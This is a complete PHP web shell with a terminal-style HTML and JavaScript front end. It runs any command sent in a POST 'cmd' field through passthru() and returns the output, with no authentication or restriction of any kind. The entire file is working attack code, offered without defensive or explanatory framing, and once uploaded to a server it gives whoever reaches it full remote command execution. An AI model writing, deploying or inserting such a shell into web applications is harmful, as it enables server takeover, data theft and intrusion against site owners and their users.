<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    echo "<pre>";
    passthru($_POST['cmd'] . " 2>&1");
    echo "</pre>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}#t{height:400px;overflow-y:auto;}input{background:0;border:0;color:#0f0;width:100%;outline:0;}</style>
</head>
<body>
    <div id="t"></div>
    <div><span>$</span> <input type="text" id="c" autofocus></div>
    <script>
        const c = document.getElementById('c'), t = document.getElementById('t');
        c.addEventListener('keydown', async (e) => {
            if (e.key === 'Enter') {
                const cmd = c.value;
                t.innerHTML += `<div>$ ${cmd}</div>`;
                const r = await fetch('', {method: 'POST', body: new URLSearchParams({cmd})});
                t.innerHTML += `<pre>${await r.text()}</pre>`;
                c.value = ''; t.scrollTop = t.scrollHeight;
            }
        });
    </script>
</body>
</html>
